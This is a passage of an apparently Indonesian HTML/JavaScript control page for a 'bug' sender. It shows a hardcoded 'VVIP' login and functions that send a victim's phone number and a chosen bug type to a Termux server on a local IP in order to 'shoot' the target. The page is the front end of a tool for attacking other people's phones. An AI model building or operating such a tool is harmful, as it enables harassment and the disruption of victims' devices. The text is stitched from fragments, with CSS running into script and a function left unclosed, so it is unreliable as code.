        .card p { font-size: 9px; color: var(--sub); margin-bottom: 10px; }
        .tag { font-size: 8px; font-weight: 800; background: rgba(0,255,0,0.1); color: var(--accent); padding: 3px 8px; border-radius: 6px; }

        .lock-icon { position: absolute; top: 10px; right: 10px; font-size: 16px; color: #ffb800; text-shadow: 0 0 5px #000; display: none; }

        const fontSize = 16; const columns = canvas.width / fontSize; const drops = [];
        for(let x = 0; x < columns; x++) drops[x] = 1;
        function drawMatrix() {
            ctx.fillStyle = "rgba(5, 5, 5, 0.05)"; ctx.fillRect(0, 0, canvas.width, canvas.height);

            for(let i = 0; i < drops.length; i++) {
                const text = chars[Math.floor(Math.random() * chars.length)];
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            }

        // 4. BUG SIGN IN
        function doBugLogin() {
            const u = document.getElementById('bug-user').value;
            const p = document.getElementById('bug-pass').value;
            if(u === 'Kaze Morales' && p === 'KazeMorales1') {
                document.getElementById('bug-login-view').style.display = 'none';
                document.getElementById('bug-dashboard-view').style.display = 'block';
                logBug('Akses VVIP Diterima. Dashboard terbuka.');
            } else {
                alert('Akses Ditolak! Khusus VVIP.');
            }
        }

        function logBug(msg) {
            const l = document.getElementById('bug-log');
            l.innerHTML += `<br>[${new Date().toLocaleTimeString()}] ${msg}`;
            l.scrollTop = l.scrollHeight;
        }

        // KONEKSI KE SERVER BUG (Ganti IP sesuai Termux lo)
        const BUG_SERVER = "http://192.168.1.44:5050"; 

        async function sendBug() {
            const target = document.getElementById('targetNum').value;
            const type = document.getElementById('bugType').value;
            if(!target) return alert('Isi target!');
            logBug('Menembak ' + target + ' pakai ' + type + '...');
            try {
                const res = await fetch(BUG_SERVER + '/api/send', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({phone: 'private', target: target, type: type}) });
                const data = await res.json();
                if(data.ok) logBug('SUKSES: ' + data.message); else logBug('GAGAL: ' + data.error);
            } catch(e) { logBug('ERROR: Server Offline / CORS.'); }
        }

        async function stopBug() {
            logBug('Menghentikan proses...');
            try {
                const res = await fetch(BUG_SERVER + '/api/stop', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({phone: 'private'}) });
                const data = await res.json();
                if(data.ok) logBug('STOPPED!'); else logBug('GAGAL STOP: ' + data.error);
            } catch(e) { logBug('ERROR: Server Offline.'); }
        }
    </script>
</body>
</html>
